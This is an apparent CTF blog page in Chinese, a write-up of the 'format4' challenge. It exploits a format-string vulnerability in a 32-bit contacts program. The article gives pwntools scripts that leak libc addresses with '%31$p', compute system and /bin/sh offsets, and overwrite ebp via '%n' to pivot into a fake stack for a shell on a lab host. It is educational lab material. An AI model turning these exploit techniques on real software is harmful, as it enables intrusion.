@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>format4_old | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先查看保护机制：
+32位程序，开启了栈溢出保护和NX，可以修改got表
+然后我们运行程序，查看程序的内容：
+可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
+根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
+然后我们在IDA中查看文件：
+这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
+现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
+答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
+而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
+所以这道题我们不能直接利用%n修改栈中的值来获得shell。
+那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
+1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
+所以我们还是要泄露程序的libc版本：
+from pwn import *sh = process(&#39;./format4&#39;)#sh = remote(&#39;10.0.25.109&#39;,20004)contact = ELF(&#39;./format4&#39;)#context.log_level = &#39;debug&#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Contact info: \n&#39;)sh.recvuntil(&#39;Name: &#39;)sh.sendline(name)sh.recvuntil(&#39;You have 10 numbers\n&#39;)sh.sendline(phone)sh.recvuntil(&#39;Length of description: &#39;)sh.sendline(descrip_len)sh.recvuntil(&#39;description:\n\t\t&#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;4&#39;)sh.recvuntil(&#39;Contacts:&#39;)sh.recvuntil(&#39;Description: &#39;)printf = 0x08048BD1# get system addr &amp; binsh_addrpayload = &#39;%31$paaaa&#39;createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)printcontact()libc_start_main_ret = int(sh.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/format4_old/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="format4_old" />
+<meta property="og:description" content="首先查看保护机制：
+32位程序，开启了栈溢出保护和NX，可以修改got表
+然后我们运行程序，查看程序的内容：
+可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
+根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
+然后我们在IDA中查看文件：
+这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
+现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
+答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
+而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
+所以这道题我们不能直接利用%n修改栈中的值来获得shell。
+那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
+1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
+所以我们还是要泄露程序的libc版本：
+from pwn import *sh = process(&#39;./format4&#39;)#sh = remote(&#39;10.0.25.109&#39;,20004)contact = ELF(&#39;./format4&#39;)#context.log_level = &#39;debug&#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Contact info: \n&#39;)sh.recvuntil(&#39;Name: &#39;)sh.sendline(name)sh.recvuntil(&#39;You have 10 numbers\n&#39;)sh.sendline(phone)sh.recvuntil(&#39;Length of description: &#39;)sh.sendline(descrip_len)sh.recvuntil(&#39;description:\n\t\t&#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;4&#39;)sh.recvuntil(&#39;Contacts:&#39;)sh.recvuntil(&#39;Description: &#39;)printf = 0x08048BD1# get system addr &amp; binsh_addrpayload = &#39;%31$paaaa&#39;createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)printcontact()libc_start_main_ret = int(sh." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/format4_old/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="format4_old"/>
+<meta name="twitter:description" content="首先查看保护机制：
+32位程序，开启了栈溢出保护和NX，可以修改got表
+然后我们运行程序，查看程序的内容：
+可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
+根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
+然后我们在IDA中查看文件：
+这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
+现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
+答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
+而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
+所以这道题我们不能直接利用%n修改栈中的值来获得shell。
+那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
+1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
+所以我们还是要泄露程序的libc版本：
+from pwn import *sh = process(&#39;./format4&#39;)#sh = remote(&#39;10.0.25.109&#39;,20004)contact = ELF(&#39;./format4&#39;)#context.log_level = &#39;debug&#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Contact info: \n&#39;)sh.recvuntil(&#39;Name: &#39;)sh.sendline(name)sh.recvuntil(&#39;You have 10 numbers\n&#39;)sh.sendline(phone)sh.recvuntil(&#39;Length of description: &#39;)sh.sendline(descrip_len)sh.recvuntil(&#39;description:\n\t\t&#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;4&#39;)sh.recvuntil(&#39;Contacts:&#39;)sh.recvuntil(&#39;Description: &#39;)printf = 0x08048BD1# get system addr &amp; binsh_addrpayload = &#39;%31$paaaa&#39;createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)printcontact()libc_start_main_ret = int(sh."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "format4_old",
+      "item": "https://jellyfish-pro.github.io/ctf/format4_old/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "format4_old",
+  "name": "format4_old",
+  "description": "首先查看保护机制：\n32位程序，开启了栈溢出保护和NX，可以修改got表\n然后我们运行程序，查看程序的内容：\n可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。\n根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：\n然后我们在IDA中查看文件：\n这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：\n现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？\n答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。\n而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。\n所以这道题我们不能直接利用%n修改栈中的值来获得shell。\n那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。\n1.利用程序创建目录的功能，在堆上写入一个虚假的栈。\r2.利用格式化字符串，修改函数的ebp\r3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh\n所以我们还是要泄露程序的libc版本：\nfrom pwn import *\rsh = process(\u0026#39;./format4\u0026#39;)\r#sh = remote(\u0026#39;10.0.25.109\u0026#39;,20004)\rcontact = ELF(\u0026#39;./format4\u0026#39;)\r#context.log_level = \u0026#39;debug\u0026#39;\r#通过创建目录选项，输入payload\rdef createcontact(name, phone, descrip_len, description):\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;1\u0026#39;)\rsh.recvuntil(\u0026#39;Contact info: \\n\u0026#39;)\rsh.recvuntil(\u0026#39;Name: \u0026#39;)\rsh.sendline(name)\rsh.recvuntil(\u0026#39;You have 10 numbers\\n\u0026#39;)\rsh.sendline(phone)\rsh.recvuntil(\u0026#39;Length of description: \u0026#39;)\rsh.sendline(descrip_len)\rsh.recvuntil(\u0026#39;description:\\n\\t\\t\u0026#39;)\rsh.sendline(description)\r#输入payload后利用printf函数展示结果\rdef printcontact():\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;4\u0026#39;)\rsh.recvuntil(\u0026#39;Contacts:\u0026#39;)\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\rprintf = 0x08048BD1\r# get system addr \u0026amp; binsh_addr\rpayload = \u0026#39;%31$paaaa\u0026#39;\rcreatecontact(\u0026#39;1111\u0026#39;, \u0026#39;1111\u0026#39;, \u0026#39;111\u0026#39;, payload)\rprintcontact()\rlibc_start_main_ret = int(sh.",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先查看保护机制：\n32位程序，开启了栈溢出保护和NX，可以修改got表\n然后我们运行程序，查看程序的内容：\n可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。\n根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：\n然后我们在IDA中查看文件：\n这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：\n现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？\n答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。\n而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。\n所以这道题我们不能直接利用%n修改栈中的值来获得shell。\n那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。\n1.利用程序创建目录的功能，在堆上写入一个虚假的栈。\r2.利用格式化字符串，修改函数的ebp\r3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh\n所以我们还是要泄露程序的libc版本：\nfrom pwn import *\rsh = process('./format4')\r#sh = remote('10.0.25.109',20004)\rcontact = ELF('./format4')\r#context.log_level = 'debug'\r#通过创建目录选项，输入payload\rdef createcontact(name, phone, descrip_len, description):\rsh.recvuntil('\u003e\u003e\u003e ')\rsh.sendline('1')\rsh.recvuntil('Contact info: \\n')\rsh.recvuntil('Name: ')\rsh.sendline(name)\rsh.recvuntil('You have 10 numbers\\n')\rsh.sendline(phone)\rsh.recvuntil('Length of description: ')\rsh.sendline(descrip_len)\rsh.recvuntil('description:\\n\\t\\t')\rsh.sendline(description)\r#输入payload后利用printf函数展示结果\rdef printcontact():\rsh.recvuntil('\u003e\u003e\u003e ')\rsh.sendline('4')\rsh.recvuntil('Contacts:')\rsh.recvuntil('Description: ')\rprintf = 0x08048BD1\r# get system addr \u0026 binsh_addr\rpayload = '%31$paaaa'\rcreatecontact('1111', '1111', '111', payload)\rprintcontact()\rlibc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)\rlog.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))\rlibc_base = libc_start_main_ret - 0x1aee5\rsystem_addr = libc_base + 0x41790\rbinsh_addr = libc_base + 0x18e363\rlog.success('get system addr: ' + hex(system_addr))\rlog.success('get binsh addr: ' + hex(binsh_addr)) 这里我已经找到了libc的版本和system、bin_sh的偏移量。\n找到system函数和binsh字符的偏移量后我们需要将shellcode写入bss段，并且将其地址输出出来：\npayload = flat([\rsystem_addr,\r'bbbb',\rbinsh_addr,\r'%6$p%11$pcccc',\t//偏移量11为shellcode的bss段地址，偏移量6为ebp的位置\r]) payload = flat([\rsystem_addr,\r'bbbb',\rbinsh_addr,\r'%6$p%11$pcccc',\r])\rcreatecontact('2222', '2222', '222', payload)\rprintcontact()\rsh.recvuntil('Description: ')\rdata = sh.recvuntil('cccc', drop=True)\rdata = data.split(b'0x')\rprint(data)\r#ebp_addr = int(data[1], 16）\rheap_addr = int(data[2], 16)\r#log.success('ebp_addr: ' + hex(ebp_addr))\rlog.success('heap_addr: ' + hex(heap_addr)) 现在我们知道了shellcode在bss段的地址，那么我们接下来需要做的就是利用格式化字符串，修改返回函数的值：\npart1 = (heap_addr - 4) / 2\t//将heap_addr分为两个部分\rpart2 = heap_addr - 4 - part1\rpayload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n' 最终的exp为：\n#format4\rfrom pwn import *\r#sh = process('./format4')\rsh = remote('10.0.25.109',20004)\rcontact = ELF('./format4')\r#context.log_level = 'debug'\rdef createcontact(name, phone, descrip_len, description):\rsh.recvuntil('\u003e\u003e\u003e ')\rsh.sendline('1')\rsh.recvuntil('Contact info: \\n')\rsh.recvuntil('Name: ')\rsh.sendline(name)\rsh.recvuntil('You have 10 numbers\\n')\rsh.sendline(phone)\rsh.recvuntil('Length of description: ')\rsh.sendline(descrip_len)\rsh.recvuntil('description:\\n\\t\\t')\rsh.sendline(description)\rdef printcontact():\rsh.recvuntil('\u003e\u003e\u003e ')\rsh.sendline('4')\rsh.recvuntil('Contacts:')\rsh.recvuntil('Description: ')\r## get system addr \u0026 binsh_addr\rpayload = '%31$paaaa'\rcreatecontact('1111', '1111', '111', payload)\rprintcontact()\rlibc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)\rlog.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))\rlibc_base = libc_start_main_ret - 0x18647\rsystem_addr = libc_base + 0x3a950\rbinsh_addr = libc_base + 0x15912b\rlog.success('get libc_base : ' + hex(libc_base))\rlog.success('get system addr: ' + hex(system_addr))\rlog.success('get binsh addr: ' + hex(binsh_addr))\r##gdb.attach(sh)\r#--------------------------------第二次输入--------------------------------------\r## get heap addr and ebp addr\rpayload = flat([\rsystem_addr,\r'bbbb',\rbinsh_addr,\r'%6$p%11$pcccc',\r])\rcreatecontact('2222', '2222', '222', payload)\rprintcontact()\rsh.recvuntil('Description: ')\rdata = sh.recvuntil('cccc', drop=True)\rdata = data.split(b'0x')\rprint(data)\rebp_addr = int(data[1], 16)\rheap_addr = int(data[2], 16)\r#--------------------------------第三次输入--------------------------------------\r'''\r## modify ebp\rpart1 = (heap_addr - 4) / 2\rpart2 = heap_addr - 4 - part1\rpayload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'\r##print payload\rcreatecontact('3333', '123456789', '300', payload)\rprintcontact()\rsh.recvuntil('Description: ')\rsh.recvuntil('Description: ')\r##gdb.attach(sh)\rprint('get shell')\rsh.recvuntil('\u003e\u003e\u003e ')\r##get shell\rsh.sendline('5')\r'''\rsh.interactive() ",
+  "wordCount" : "402",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/format4_old/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      format4_old
+    </h1>
+    <div class="post-meta">2 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先查看保护机制：</p>
+<p><img loading="lazy" src="/ctf/format4.img/image-20220428144505871.png" alt="image-20220428144505871"  />
+</p>
+<p>32位程序，开启了栈溢出保护和NX，可以修改got表</p>
+<p>然后我们运行程序，查看程序的内容：</p>
+<p>可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。</p>
+<p><img loading="lazy" src="/ctf/format4.img/image-20220428145027758.png" alt="image-20220428145027758"  />
+</p>
+<p>根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：</p>
+<p><img loading="lazy" src="/ctf/format4.img/image-20220428145533418.png" alt="image-20220428145533418"  />
+</p>
+<p>然后我们在IDA中查看文件：</p>
+<p><img loading="lazy" src="/ctf/format4.img/image-20220428145719463.png" alt="image-20220428145719463"  />
+</p>
+<p>这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：</p>
+<p><img loading="lazy" src="/ctf/format4.img/image-20220428150101337.png" alt="image-20220428150101337"  />
+</p>
+<p>现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？</p>
+<p>答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。</p>
+<p>而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。</p>
+<p>所以这道题我们不能直接利用%n修改栈中的值来获得shell。</p>
+<p>那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。</p>
+<pre tabindex="0"><code>1.利用程序创建目录的功能，在堆上写入一个虚假的栈。
+2.利用格式化字符串，修改函数的ebp
+3.当函数返回时，栈地址就会来到我们构建的虚假地址。
+</code></pre><p>通过IDA我们可以看到程序并没有system函数和/bin/sh</p>
+<p>所以我们还是要泄露程序的libc版本：</p>
+<pre tabindex="0"><code>from pwn import *
+
+
+sh = process(&#39;./format4&#39;)
+#sh = remote(&#39;10.0.25.109&#39;,20004)
+contact = ELF(&#39;./format4&#39;)
+#context.log_level = &#39;debug&#39;
+
+#通过创建目录选项，输入payload
+def createcontact(name, phone, descrip_len, description):
+    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Contact info: \n&#39;)
+    sh.recvuntil(&#39;Name: &#39;)
+    sh.sendline(name)
+    sh.recvuntil(&#39;You have 10 numbers\n&#39;)
+    sh.sendline(phone)
+    sh.recvuntil(&#39;Length of description: &#39;)
+    sh.sendline(descrip_len)
+    sh.recvuntil(&#39;description:\n\t\t&#39;)
+    sh.sendline(description)
+
+#输入payload后利用printf函数展示结果
+def printcontact():
+    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)
+    sh.sendline(&#39;4&#39;)
+    sh.recvuntil(&#39;Contacts:&#39;)
+    sh.recvuntil(&#39;Description: &#39;)
+
+
+printf = 0x08048BD1
+
+# get system addr &amp; binsh_addr
+payload = &#39;%31$paaaa&#39;
+createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)
+printcontact()
+libc_start_main_ret = int(sh.recvuntil(&#39;aaaa&#39;, drop=True), 16)
+log.success(&#39;get libc_start_main_ret addr: &#39; + hex(libc_start_main_ret))
+libc_base = libc_start_main_ret - 0x1aee5
+system_addr = libc_base + 0x41790
+binsh_addr = libc_base + 0x18e363
+log.success(&#39;get system addr: &#39; + hex(system_addr))
+log.success(&#39;get binsh addr: &#39; + hex(binsh_addr))
+</code></pre><p>这里我已经找到了libc的版本和system、bin_sh的偏移量。</p>
+<p><img loading="lazy" src="/ctf/format4.img/image-20220428152553020.png" alt="image-20220428152553020"  />
+</p>
+<p>找到system函数和binsh字符的偏移量后我们需要将shellcode写入bss段，并且将其地址输出出来：</p>
+<pre tabindex="0"><code>payload = flat([
+    system_addr,
+    &#39;bbbb&#39;,
+    binsh_addr,
+    &#39;%6$p%11$pcccc&#39;,		//偏移量11为shellcode的bss段地址，偏移量6为ebp的位置
+])
+</code></pre><pre tabindex="0"><code>payload = flat([
+    system_addr,
+    &#39;bbbb&#39;,
+    binsh_addr,
+    &#39;%6$p%11$pcccc&#39;,
+])
+createcontact(&#39;2222&#39;, &#39;2222&#39;, &#39;222&#39;, payload)
+printcontact()
+sh.recvuntil(&#39;Description: &#39;)
+data = sh.recvuntil(&#39;cccc&#39;, drop=True)
+data = data.split(b&#39;0x&#39;)
+
+print(data)
+#ebp_addr = int(data[1], 16）
+heap_addr = int(data[2], 16)
+
+#log.success(&#39;ebp_addr: &#39; + hex(ebp_addr))
+log.success(&#39;heap_addr: &#39; + hex(heap_addr))
+</code></pre><p><img loading="lazy" src="/ctf/format4.img/image-20220428154852227.png" alt="image-20220428154852227"  />
+</p>
+<p>现在我们知道了shellcode在bss段的地址，那么我们接下来需要做的就是利用格式化字符串，修改返回函数的值：</p>
+<pre tabindex="0"><code>
+part1 = (heap_addr - 4) / 2			//将heap_addr分为两个部分
+part2 = heap_addr - 4 - part1
+payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
+</code></pre><p>最终的exp为：</p>
+<pre tabindex="0"><code>#format4
+from pwn import *
+
+
+#sh = process(&#39;./format4&#39;)
+sh = remote(&#39;10.0.25.109&#39;,20004)
+contact = ELF(&#39;./format4&#39;)
+#context.log_level = &#39;debug&#39;
+
+
+def createcontact(name, phone, descrip_len, description):
+    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Contact info: \n&#39;)
+    sh.recvuntil(&#39;Name: &#39;)
+    sh.sendline(name)
+    sh.recvuntil(&#39;You have 10 numbers\n&#39;)
+    sh.sendline(phone)
+    sh.recvuntil(&#39;Length of description: &#39;)
+    sh.sendline(descrip_len)
+    sh.recvuntil(&#39;description:\n\t\t&#39;)
+    sh.sendline(description)
+
+
+def printcontact():
+    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)
+    sh.sendline(&#39;4&#39;)
+    sh.recvuntil(&#39;Contacts:&#39;)
+    sh.recvuntil(&#39;Description: &#39;)
+
+
+## get system addr &amp; binsh_addr
+payload = &#39;%31$paaaa&#39;
+createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)
+printcontact()
+libc_start_main_ret = int(sh.recvuntil(&#39;aaaa&#39;, drop=True), 16)
+log.success(&#39;get libc_start_main_ret addr: &#39; + hex(libc_start_main_ret))
+
+
+libc_base = libc_start_main_ret - 0x18647
+system_addr = libc_base + 0x3a950
+binsh_addr = libc_base + 0x15912b
+log.success(&#39;get libc_base : &#39; + hex(libc_base))
